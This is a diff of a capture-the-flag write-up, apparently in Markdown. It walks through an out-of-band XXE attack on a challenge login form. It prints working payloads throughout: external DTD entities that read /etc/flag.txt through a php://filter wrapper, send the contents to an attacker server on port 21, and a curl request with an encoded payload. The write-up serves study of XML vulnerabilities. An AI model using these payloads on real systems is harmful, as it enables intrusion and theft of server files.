+<!ENTITY % a SYSTEM "http://<IP>:80/dtds/sp2.dtd">
 %a;
 %c;
 ]>
 ```
-This is called internal DTD or Internal Document Type Definition and we have specified a special type entity called Parameter Entity `<!ENTITY % a SYSTEM "http://x.x.x.x:80/dtds/sp2.dtd">%a;` which allows us to define an external URI within our Internal DTD.
+This is called internal DTD or Internal Document Type Definition and we have specified a special type entity called Parameter Entity `<!ENTITY % a SYSTEM "http://<IP>:80/dtds/sp2.dtd">%a;` which allows us to define an external URI within our Internal DTD.
 Parameter Entitys can only be loaded inside DTD so we couldn't use it in the root XML like `<user>&a;</user>`
 We use `<user>&body;</user>` and the entity value body is inside sp2.dtd which is hosted in our public facing server
 So the parser reads our external dtd.
-```
+```html
 <!ENTITY % d SYSTEM "file:///etc/flag.txt">
-<!ENTITY % c "<!ENTITY body SYSTEM 'ftp://x.x.x.x:21/%d;'>">
+<!ENTITY % c "<!ENTITY body SYSTEM 'ftp://<IP>:21/%d;'>">
 ```
 First it tries to retreive `/etc/flag.txt` and put it in our `%d;` entity. Next line we have `%c;` from our payload which loads up the flag from the server and servers it to our payload
 This is what the request would look like:
-```
+```html
 <!DOCTYPE creds [
-<!ENTITY % a SYSTEM "http://x.x.x.x:80/dtds/sp2.dtd">
-%a; = <!ENTITY a SYSTEM "http://x.x.x.x:80/dtds/sp2.dtd>
+<!ENTITY % a SYSTEM "http://<IP>:80/dtds/sp2.dtd">
+%a; = <!ENTITY a SYSTEM "http://<IP>:80/dtds/sp2.dtd>
     sp2.dtd = <!ENTITY % d SYSTEM "file:///etc/flag.txt">
-              <!ENTITY % c "<!ENTITY body SYSTEM 'ftp://x.x.x.x:21/%d;'>">
-%c; = <!ENTITY body SYSTEM "ftp://x.x.x.x:21/?CONTENTS_OF_ETC_FLAG.TXT">
+              <!ENTITY % c "<!ENTITY body SYSTEM 'ftp://<IP>:21/%d;'>">
+%c; = <!ENTITY body SYSTEM "ftp://<IP>:21/?CONTENTS_OF_ETC_FLAG.TXT">
 ]>
 <creds>
     <user>&body; = CONTENTS_OF_ETC_FLAG.TXT</user>
@@ -1743,27 +1690,27 @@ This is what the request would look like:
 </creds>
 ```
 But since our request was invalid we need to figure out what was wrong. Firstly I read something about retrieving files in PHP environment and it requires filter so we change our `file:///etc/flag.txt` into `php://filter/convert.base64-encode/resource=/etc/flag.txt` which encodes any response from the server into base64. We try this out if it helps but nothing, still getting invalid request. Maybe it has something to do with our use of FTP, lets just use HTTP for the entire process.
-So we change our sp2.dtd into `http://x.x.x.x:80/%d;` and try to curl again, but alas no success. Still not getting any response to our xxeserv. Lets try something else. What if we change our default port from 80 to something else. I tried probably around ~40 different ports without any success until it hit me to try FTP port 21 as our http port.
+So we change our sp2.dtd into `http://<IP>:80/%d;` and try to curl again, but no success. Still not getting any response to our xxeserv. Lets try something else. What if we change our default port from 80 to something else. I tried probably around ~40 different ports without any success until it hit me to try FTP port 21 as our http port.
 So we setup xxeserv with `xxeserv -w -wp 21` and change our external DTD to:
-```
+```html
 <!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/etc/flag.txt">
-<!ENTITY % c "<!ENTITY body SYSTEM 'http://x.x.x.x:21/%d;'>">
+<!ENTITY % c "<!ENTITY body SYSTEM 'http://<IP>:21/%d;'>">
 ```
 and our payload to
-```
-<!DOCTYPE creds [ <!ENTITY % a SYSTEM "http://x.x.x.x:21/dtds/sp2.dtd">%a;%c;]>
+```html
+<!DOCTYPE creds [ <!ENTITY % a SYSTEM "http://<IP>:21/dtds/sp2.dtd">%a;%c;]>
 <creds>
     <user>&body;</user>
     <pass>password</pass>
 </creds>
 ```
 and we do a curl
-```
+```bash
 $ curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Connection: close" --data "xml=PCFET0NUWVBFIGNyZWRzIFsgPCFFTlRJVFkgJSBhIFNZU1RFTSAiaHR0cDovLzE5NS4xNDguMjIuODI6MjEvc3AyLmR0ZCI%2BJWE7JWM7XT4KPGNyZWRzPgogICAgPHVzZXI%2BJmJvZHk7PC91c2VyPgogICAgPHBhc3M%2BcGFzc3dvcmQ8L3Bhc3M%2BCjwvY3JlZHM%2B" http://securelogin.challenge.fi:8880/xml.php
 Username or password not found! Try Harder!
 ```
 I thought "nononono not this again...." but then I checked my xxeserv and FINALLY I got a response from the server!
-```
+```bash
 $ ./xxeserv -w -wp 21
 2021/04/01 10:19:50 [*] Starting Web Server on 21 [./]
 [*] Found certificate files in directory. Using these.
